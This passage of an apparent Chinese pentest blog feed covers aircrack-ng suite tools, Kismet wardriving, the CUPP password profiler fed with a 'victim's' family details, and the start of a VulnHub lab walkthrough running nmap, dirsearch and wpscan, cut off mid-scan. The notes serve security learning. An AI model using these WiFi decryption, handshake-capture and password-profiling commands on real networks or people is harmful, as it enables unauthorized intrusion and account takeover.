<li><strong>AP 连接到有线网络，称为 Distribution System
(DS)。</strong></li>
<li><strong>连接到同一个 DS 的多个 AP 形成 Extended Service Set
(ESS)，ESSID相当于交换机的MAC。</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220319171447767-1277412205.png" /></p>
<h3 id="ad-hoc">2、AD-HOC</h3>
<p><strong>也被称为Independent Basic Service Set (IBSS)</strong></p>
<p><strong>有至少2个STAs直接通信组成</strong></p>
<p><strong>也称为peer to peer模式</strong></p>
<p><strong>其中一个STA负责AP的工作</strong></p>
<ul>
<li>通过beacon广播SSID</li>
<li>对其他STAs进行身份验证</li>
</ul>
<h3 id="wireless-distribution-system-wds"><strong>3、WIRELESS
DISTRIBUTION SYSTEM (WDS)</strong></h3>
<p><strong>与有线DS类似，只是通过无线连接的多个AP组成的网络</strong></p>
<ul>
<li><strong>Bridging------只有AP间彼此通信</strong></li>
<li><strong>Repeating-----允许所有AP和STA进行通信</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220319172222854-613894260.png" /></p>
<h3 id="monitor-modr">4、MONITOR MODR</h3>
<p><strong>Monitor不是一种真的无线模式</strong></p>
<ul>
<li>但是对无线渗透至关重要</li>
<li>允许无线网卡没有任何筛选的(802.11包头)</li>
<li>与有线网络的混杂模式可以类比</li>
<li>合适的网卡和驱动不但可以monitor，更可以injection</li>
</ul>
<p><strong>推荐阅读：<a
href="https://blog.csdn.net/qq_39689711/article/details/117886205">WLAN基本知识之802.11标准</a></strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
        <tag>802.11 协议</tag>
      </tags>
  </entry>
  <entry>
    <title>AIRCRACK-NG SUITE 其他工具</title>
    <url>/2022/06/12/AIRCRACK-NG%20SUITE%20%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<h2 id="airdecap-ng">1. AIRDECAP-NG</h2>
<h3 id="基本介绍">1、基本介绍</h3>
<p><strong>解密抓到的数据包（已破解WIFI密码），仅针对无线层的加密进行解密</strong></p>
<p><strong>去除802.1 1头</strong></p>
<p><strong>airdecap-ng -b <AP MAC> 1 .pcap</strong></p>
<p><strong>解密WEP加密数据</strong></p>
<p><strong>airdecap-ng -W <WEP key>-b <AP MAC> 1 .pcap</strong></p>
<p><strong>必须与AP建立关联关系</strong></p>
<p><strong>解密WPA加密数据</strong></p>
<p><strong>airdecap-ng -e kifi -p <PSK> -b <AP MAC> 1 .pcap</strong></p>
<p><strong>抓包文件中必须包含4步握手信息，否则无解</strong></p>
<h3 id="演示">2、演示</h3>
<ul>
<li><strong>解密前</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612152950574-189454367.png" /></p>
<ul>
<li><strong>解密</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612153430753-207853137.png" /></p>
<ul>
<li><strong>解密后</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612153647986-1081443468.png" /></p>
<h2 id="airserv-ng">2. AIRSERV-NG</h2>
<h3 id="基本介绍-1"><strong>1、基本介绍</strong></h3>
<p><strong>AIRSERV-NG可以对AP联网远程操作</strong></p>
<p><strong>通过网络提供无线网卡服务器</strong></p>
<p><strong>某些网卡不支持客户端/服务器模式</strong></p>
<p><strong>图解</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612160606477-878842120.png" /></p>
<p><strong>airserv-ng使得PC-B的网卡可以为PC-A（远控）提供服务（对B地区进行嗅探，抓包等）</strong></p>
<p><strong>步骤</strong></p>
<p><strong>PC-B启动无线侦听</strong></p>
<p><strong>服务器端（PC-B）</strong></p>
<p><strong>airserv-ng -P 3333 -d wlan2mon</strong></p>
<p><strong>客户端（PC-A）</strong></p>
<p><strong>airodump-ng 远程ip:3333</strong></p>
<p><strong>注，某些防火墙会影响C / S间的通信</strong></p>
<h3 id="演示-1">2、演示</h3>
<ul>
<li><strong>服务端PC-B【kali-2022.2：10.10.10.196】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612162023129-146895821.png" /></p>
<ul>
<li><strong>PC-A远程操控时</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612162042752-453191979.png" /></p>
<ul>
<li><strong>客户端PC-A【kali-2019.3：10.10.10.198】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612162001311-1756022346.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220612162009220-1318318128.png" /></p>
<h2 id="airtun-ng">3. AIRTUN-NG</h2>
<h3 id="原理介绍"><strong>1、原理介绍</strong></h3>
<p><strong>Airtun-NG是一个虚拟隧道接口创建工具，可以监视所有加密流量以实现wIDS【可以实时发给IDS，也可以先保存下来，后面再重放给IDS】</strong></p>
<p><strong>无限入侵检测wIDS</strong></p>
<ul>
<li><strong>无线密码，BSSID</strong></li>
<li><strong>需获得握手包</strong></li>
</ul>
<p><strong>中继、重放</strong></p>
<ul>
<li><strong>repeate【中继器功能，强调实时】，replay【强调随时】</strong></li>
</ul>
<p><strong>wIDS</strong></p>
<ul>
<li><strong>WEP: airtun-ng -a <AP MAC> -W SKA
wlan2mon【SKA是WEP的加密密钥，注意需要和AP建立关联】</strong></li>
<li><strong>WPA: airtun-ng -a <AP MAC> -p PSK -e kifi wlan2mon
【PSK是WPA加密下的WiFi密码，注意需要和AP建立关联】</strong></li>
<li><strong>#开启后使用wireshake监听at0可以实时抓取所有包</strong></li>
<li><strong>#也可以启用disniff、driftnet等嗅探工具对at0进行木马嗅探</strong></li>
<li><strong>ifconfig at0 up（先开启后前面的命令才会生效）</strong></li>
<li><strong>四步握手</strong></li>
<li><strong>理论_上支持多AP的wlDS,但2个AP以上时可靠性会下降【不同信道切换会掉包】</strong></li>
<li><strong>WPA: airtun-ng -a <AP MAC> -p PSK -e kif1
wlan2mon</strong></li>
<li><strong>ifconfig at1 up</strong></li>
<li><strong>多AP不同信道时airodump -C 1,11 wlan2mon</strong></li>
</ul>
<p><strong>Repeate</strong></p>
<ul>
<li><strong>WDS/Bridge</strong></li>
<li><strong>扩展无线侦听的距离</strong></li>
<li><strong>两块网卡都置于 monitor 模式</strong></li>
<li><strong>airtun-ng -a <AP MAC> --repeat --bssid <AP MAC> -i wlan0mon
wlan1mon</strong></li>
<li><strong>wlan0mon：收包网卡</strong></li>
<li><strong>wlan1mon：发包网卡</strong></li>
<li><strong>-a：发包源地址</strong></li>
<li><strong>--bssid：过滤只发指定源地址的包【可选项】</strong></li>
</ul>
<p><strong>Replay</strong></p>
<ul>
<li><strong>将抓到的CAP文件重放到指定网卡</strong></li>
<li><strong>airtun-ng -a <Source MAC> -r 1.cap <interface></strong></li>
</ul>
<h3 id="演示-2">2、演示</h3>
<ul>
<li>** 启动监听**</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617181200859-1676715765.png" /></p>
<ul>
<li>** 搜寻目标**</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617181226687-476302234.png" /></p>
<ul>
<li>** 监听**</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617181256815-1948512690.png" /></p>
<ul>
<li>** 启动at0**</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617203508453-891351851.png" /></p>
<ul>
<li>** 抓取握手包**</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617181459685-108894006.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617181520052-1155408991.png" /></p>
<ul>
<li><strong>wireshark抓取当前连接AP的station的通信【at0】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617181622749-640223334.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617181657757-1326363329.png" /></p>
<ul>
<li><strong>将抓的包重放之IDS【snort】进行监测分析</strong></li>
</ul>
<p><strong>待补 ……</strong></p>
<ul>
<li><strong>也可以启动一些其它的嗅探工具，如driftnet：</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># driftnet -i at0 </span></span><br></pre></td></tr></table></figure>
<ul>
<li><strong>可能的报错及解决</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># driftnet -i at0</span></span><br><span class="line">Gtk-Message: 06:36:57.635: Failed to load module <span class="string">&quot;gail&quot;</span></span><br><span class="line"></span><br><span class="line"> (driftnet:29654): WARNING : 06:36:57.644: (../atk-adaptor/bridge.c:1018):atk_bridge_adaptor_init: runtime check failed: (root)</span><br><span class="line">                                                                                                                                              </span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># apt-get install libgail-common </span></span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">The following additional packages will be installed:</span><br><span class="line">  libgail18</span><br><span class="line">The following NEW packages will be installed:</span><br><span class="line">  libgail-common libgail18</span><br><span class="line">0 upgraded, 2 newly installed, 0 to remove and 443 not upgraded.</span><br><span class="line">Need to get 218 kB of archives.</span><br><span class="line">After this operation, 571 kB of additional disk space will be used.</span><br><span class="line">……………………</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>repeate</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617204103021-2100831609.png" /></p>
<h2 id="besside-ng">4. besside-ng</h2>
<p><strong>打掉现有连接【和aireplay-ng有点相似】，抓取握手包，支持上传到
wpa.darkircop.org 在线破解握手包。</strong></p>
<ul>
<li><strong>帮助信息</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># besside-ng -h                                   </span></span><br><span class="line"></span><br><span class="line">  Besside-ng 1.6  - (C) 2010 Andrea Bittau</span><br><span class="line">  https://www.aircrack-ng.org</span><br><span class="line"></span><br><span class="line">  Usage: besside-ng [options] &lt;interface&gt;</span><br><span class="line"></span><br><span class="line">  Options:</span><br><span class="line"></span><br><span class="line">       -b &lt;victim mac&gt;       Victim BSSID</span><br><span class="line">       -R &lt;victim ap regex&gt;  Victim ESSID regex (requires PCRE)</span><br><span class="line">       -s &lt;WPA server&gt;       Upload wpa.cap <span class="keyword">for</span> cracking</span><br><span class="line">       -c &lt;chan&gt;             chanlock</span><br><span class="line">       -p &lt;pps&gt;              flood rate</span><br><span class="line">       -W                    WPA only</span><br><span class="line">       -v                    verbose, -vv <span class="keyword">for</span> more, etc.</span><br><span class="line">       -h                    This <span class="built_in">help</span> screen</span><br></pre></td></tr></table></figure>
<h2 id="fern-wifi-cracker图形界面">5. fern-wifi-cracker【图形界面】</h2>
<p><strong>先执行下面命令，再打开fern-wifi-cracker！</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">airmon-ng check <span class="built_in">kill</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617215017734-2096599444.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617220722020-895481216.png" /></p>
<ul>
<li><strong>点击WPA查看扫到的信息</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617220809099-2115139459.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220617220828349-259603660.png" /></p>
<h2 id="无线侦察">6. 无线侦察</h2>
<h3 id="kismet介绍已出web图形界面">1、Kismet介绍【已出web图形界面】</h3>
<p>Kismet 是一个无线网络和设备检测器、嗅探器、wardriving 工具和
WIDS（无线入侵检测）框架。</p>
<p>Kismet 可与 Wi-Fi 接口、蓝牙接口、一些 SDR（软件定义无线电）硬件（如
RTLSDR）和其他专用捕获硬件配合使用。</p>
<p>Kismet 在 Linux、OSX 以及 WSL 框架下的 Windows 10 上工作。在 Linux
上，它适用于大多数 Wi-Fi 卡、蓝牙接口和其他硬件设备。在 OSX
上，它可以与内置的 Wi-Fi 接口一起使用，在 Windows
10上，它可以与远程捕获一起使用。</p>
<p>官网：<a href="https://www.kismetwireless.net/"
class="uri">https://www.kismetwireless.net/</a></p>
<h3 id="使用结合谷歌地球使用">2、使用【结合谷歌地球使用】</h3>
<p>kismet</p>
<ul>
<li>kismet*.nettxt</li>
<li>kismet*.pcapdump</li>
</ul>
<p>gpsd -n -N -D4 /dev/ttyUSB0【运行GPS】</p>
<p>giskismet -x
Kismet-*.netxml【处理kismet扫描生成的xml文件，AP的GPS，MAC，ESSID等信息】</p>
<p>giskismet -q "select * from wireless" -o
gps.kml【生成谷歌地球可打开的文件】</p>
<ul>
<li><strong>启动</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618095103005-715772420.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618095212526-367031876.png" /></p>
<ul>
<li>** 浏览器登陆即可【初次登录会要求创建个账号】**</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618095614017-1435805085.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618100134516-1317867877.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618100350842-1246149434.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618100413136-1382441471.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618100712845-897264937.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618110139767-755374416.png" /></p>
<ul>
<li><strong>谷歌地球安装</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://dl.google.com/dl/earth/client/current/google-earth-stable_current_amd64.deb</span><br><span class="line">dpkg -i google-earth-stable_current_amd64.deb </span><br></pre></td></tr></table></figure>
<p><strong>注，安装如果缺依赖包，则用 apt-get -f install
强制安装所需依赖包</strong></p>
<ul>
<li><strong>启动使用【前提自己可访问外网】</strong></li>
</ul>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618112636247-847683052.png" /></strong></p>
<ul>
<li><strong>如果上面有生成kml文件，则可以导入谷歌地球查看AP的位置分布【下图来自网上】</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618111905678-821924749.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220618111920375-260527114.png" /></p>
<p><strong>注，文本界面的教程可参见：<a
href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/51.html"
class="uri">https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/51.html</a></strong></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>CUPP 生成专属的密码字典</title>
    <url>/2021/11/17/CUPP%20%E7%94%9F%E6%88%90%E4%B8%93%E5%B1%9E%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/</url>
    <content><![CDATA[<h2 id="kali下载安装-cupp">1、Kali下载安装 <strong>cupp</strong></h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/Mebus/cupp.git</span><br></pre></td></tr></table></figure>
<h2 id="使用cupp生成专属字典">2、使用cupp生成专属字典</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/Desktop/Tools/cupp-master<span class="comment"># ./cupp.py -h</span></span><br><span class="line">usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]</span><br><span class="line"></span><br><span class="line">Common User Passwords Profiler</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --<span class="built_in">help</span>         show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -i, --interactive  Interactive questions <span class="keyword">for</span> user password profiling</span><br><span class="line">  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl</span><br><span class="line">                     output to make some pwnsauce</span><br><span class="line">  -l                 Download huge wordlists from repository</span><br><span class="line">  -a                 Parse default usernames and passwords directly from</span><br><span class="line">                     Alecto DB. Project Alecto uses purified databases of</span><br><span class="line">                     Phenoelit and CIRT <span class="built_in">which</span> were merged and enhanced</span><br><span class="line">  -v, --version      Show the version of this program.</span><br><span class="line">  -q, --quiet        Quiet mode (don<span class="string">&#x27;t print banner)</span></span><br><span class="line"><span class="string">root@kali:~/Desktop/Tools/cupp-master# ./cupp.py -i</span></span><br><span class="line"><span class="string"> ___________ </span></span><br><span class="line"><span class="string">   cupp.py!                 # Common</span></span><br><span class="line"><span class="string">      \                     # User</span></span><br><span class="line"><span class="string">       \   ,__,             # Passwords</span></span><br><span class="line"><span class="string">        \  (oo)____         # Profiler</span></span><br><span class="line"><span class="string">           (__)    )\   </span></span><br><span class="line"><span class="string">              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]</span></span><br><span class="line"><span class="string">                            [ Mebus | https://github.com/Mebus/]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Insert the information about the victim to make a dictionary</span></span><br><span class="line"><span class="string">[+] If you don&#x27;</span>t know all the info, just hit enter when asked! ;)</span><br><span class="line"></span><br><span class="line">&gt; First Name: tom</span><br><span class="line">&gt; Surname: jack</span><br><span class="line">&gt; Nickname: BOb        </span><br><span class="line">&gt; Birthdate (DDMMYYYY): 01012010</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; Partners) name: AP</span><br><span class="line">&gt; Partners) nickname: AQ      </span><br><span class="line">&gt; Partners) birthdate (DDMMYYYY): 02021990</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; Child<span class="string">&#x27;s name: tim</span></span><br><span class="line"><span class="string">&gt; Child&#x27;</span>s nickname: </span><br><span class="line">&gt; Child<span class="string">&#x27;s birthdate (DDMMYYYY): 28042021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&gt; Pet&#x27;</span>s name: hello</span><br><span class="line">&gt; Company name: ali</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; Do you want to add some key words about the victim? Y/[N]: Y</span><br><span class="line">&gt; Please enter the words, separated by comma. [i.e. hacker,juice,black], spaces will be removed: hacker,haha,MAKE</span><br><span class="line">&gt; Do you want to add special chars at the end of words? Y/[N]: </span><br><span class="line">&gt; Do you want to add some random numbers at the end of words? Y/[N]:007</span><br><span class="line">&gt; Leet mode? (i.e. leet = 1337) Y/[N]: </span><br><span class="line"></span><br><span class="line">[+] Now making a dictionary...</span><br><span class="line">[+] Sorting list and removing duplicates...</span><br><span class="line">[+] Saving dictionary to tom.txt, counting 14680 words.</span><br><span class="line">&gt; Hyperspeed Print? (Y/n) : </span><br><span class="line">[+] Now load your pistolero with tom.txt and shoot! Good luck!</span><br><span class="line">root@kali:~/Desktop/Tools/cupp-master<span class="comment"># ls</span></span><br><span class="line">CHANGELOG.md  cupp.py  README.md    test_cupp.py</span><br><span class="line">cupp.cfg      LICENSE  screenshots  tom.txt</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop/Tools/cupp-master<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<p>执行./cupp.py -i后按照提示输入已知信息，生成专属字典</p>
<p><strong>生成的字典 tom.txt 如下：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211117192821465-410199901.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>密码破解</category>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>字典</tag>
      </tags>
  </entry>
  <entry>
    <title>Beelzebub: 1</title>
    <url>/2024/03/08/Beelzebub%201/</url>
    <content><![CDATA[<blockquote>
<p>靶机：<a
href="https://www.vulnhub.com/entry/beelzebub-1,742/">Beelzebub: 1 ~
VulnHub</a></p>
</blockquote>
<h2 id="信息收集">1. 信息收集</h2>
<h3 id="主机探测">1.1. 主机探测</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071039871.png" /></p>
<h3 id="端口扫描">1.2. 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.159.131 -p1-65535</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071042994.png" /></p>
<p>开放端口：22,80</p>
<h3 id="fscan-漏扫">1.3. fscan 漏扫</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./fscan_amd64 -h 192.168.159.131 </span><br></pre></td></tr></table></figure>
<p>没扫到有价值信息……</p>
<h3 id="web-信息收集">1.4. web 信息收集</h3>
<p>目录遍历</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.131/&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071049103.png" /></p>
<p>依次访问</p>
<p>访问出现 /index.php 响应404 ，但源码有个隐藏信息……</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071400946.png" /></p>
<p>根据提示可能要对 beelzebub 进行 MD5
哈希：d18e1e22becbd915b45e0e655429d487，暂没其它思路</p>
<p>phpinfo.php 可以看到系统的一些基本信息，后续提权或许有用……</p>
<p>phpmyadmin
尝试弱口令爆破未果……谷歌……MD5(beelzebub)=d18e1e22becbd915b45e0e655429d487
是个目录，哎……</p>
<p>加上该路径没法正常访问，会重定向之192.168.1.6……</p>
<p>尝试再次目录遍历</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/&quot;</span></span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202403071413461.png" /></p>
<p>看结果是个WP站点……用 wpscan 扫下看有啥未修复漏洞没……</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/&quot;</span> --ignore-main-redirect --force  -e </span><br><span class="line"><span class="comment"># --ignore-main-redirect 避免被重定向【不加会重定向到192.168.1.6】</span></span><br><span class="line"><span class="comment"># --force 强制执行扫描，即使目标站点似乎不是 WordPress</span></span><br><span class="line"><span class="comment"># -e 枚举主题，插件，用户等</span></span><br></pre></td></tr></table></figure>
<p>扫描结果</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.22</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/ [192.168.159.131]</span></span><br><span class="line"><span class="string">[+] Started: Thu Mar  7 01:49:31 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.29 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - X-Redirect-By: WordPress</span></span><br><span class="line"><span class="string"> | Found By: Headers (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] XML-RPC seems to be enabled: http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/xmlrpc.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span></span><br><span class="line"><span class="string"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress readme found: http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/readme.html</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Upload directory has listing enabled: http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/wp-content/uploads/</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 100%</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] The external WP-Cron seems to be enabled: http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/wp-cron.php</span></span><br><span class="line"><span class="string"> | Found By: Direct Access (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confidence: 60%</span></span><br><span class="line"><span class="string"> | References:</span></span><br><span class="line"><span class="string"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"><span class="string"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] WordPress version 5.3.6 identified (Insecure, released on 2020-10-30).</span></span><br><span class="line"><span class="string"> | Found By: Atom Generator (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/index.php/feed/atom/, &lt;generator uri=&quot;https://wordpress.org/&quot; version=&quot;5.3.6&quot;&gt;WordPress&lt;/generator&gt;</span></span><br><span class="line"><span class="string"> | Confirmed By: Style Etag (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://192.168.159.131/d18e1e22becbd915b45e0e655429d487/wp-admin/load-styles.php, Match: &#x27;</span>5.3.6<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] The main theme could not be detected.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating 